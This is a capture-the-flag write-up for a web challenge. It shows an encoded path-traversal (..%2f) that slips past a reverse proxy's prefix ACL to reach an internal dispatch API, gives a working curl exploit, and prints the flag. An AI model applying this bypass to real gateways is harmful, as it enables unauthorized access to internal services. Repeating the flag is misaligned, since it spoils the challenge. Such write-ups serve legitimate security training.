# Corridor Transit Gate

**Author:** kiriesh

**Web**
Handout: `files/api_specification.json`

## Solve

The Caledonian Transit Logistics Directorate API holds convoy `CTLD-FR-8821` at weighbridge CP-04: the WIM scale read 46 200 kg against a declared 22 000 (viaduct limit 40 000). Standard `/api/v1/clearance/request` is refused with `ERR_AXLE_WEIGHT_DISCREPANCY` → "requires the internal dispatch controller".

**The gateway ACL.** Everything under `/api/v1/internal/*` returns `403 GW_ACL_INTERNAL_ROUTE_PROHIBITED` from the front proxy (`CTLD-Gateway`, a Go reverse proxy). The ACL is bound to the raw path prefix — `X-Forwarded-For`/`X-Real-IP` spoofing and dot/slash normalisation (`//`, `/./`, `/../`) all still resolve to 403.

**The bypass.** The public route `/api/v1/telemetry/station/{id}` takes an `{id}` segment. The gateway checks its ACL against the raw (still URL-encoded) path and does **not** decode `%2f`, but the Go backend decodes `%2f` and resolves the traversal. So:

```
/api/v1/telemetry/station/..%2f..%2finternal%2f<route>
```

reaches the internal router past the ACL — the backend answers with its own JSON 404 echoing the decoded path, a handy oracle (confirmed by traversing to a known route like `corridor/status`).

**The exact route.** Generic names (`dispatch`, `override`, …) 404'd. The docket page `/portal/consignment/CTLD-FR-8821` loads `/static/assets/js/chunks/chunk-dispatch-admin.9c4d.js`, which defines `internalDispatch: "/api/v1/internal/dispatch/emergency-clearance"` (POST, body `{consignment_id, reason}`).

**Exploit.** POST that route through the traversal bypass:

```bash
curl --path-as-is -X POST \
  -H "Content-Type: application/json" -H "X-Requested-With: XMLHttpRequest" \
  -d '{"consignment_id":"CTLD-FR-8821","reason":"Authorized emergency corridor escort"}' \
  'http://<assigned-host>:<port>/api/v1/telemetry/station/..%2f..%2finternal%2fdispatch%2femergency-clearance'
```

Response: `status: APPROVED`, `gate_barrier_state: OPEN`, and `clearance_token` = the flag.

**Flag:** `CSCTF{BLPdbJc1rnZHxvVkeUf62RZr}`

Run [the solver](solve.py) with `python3 solve.py http://<assigned-host>:<port>`. The web address must be your assigned instance.
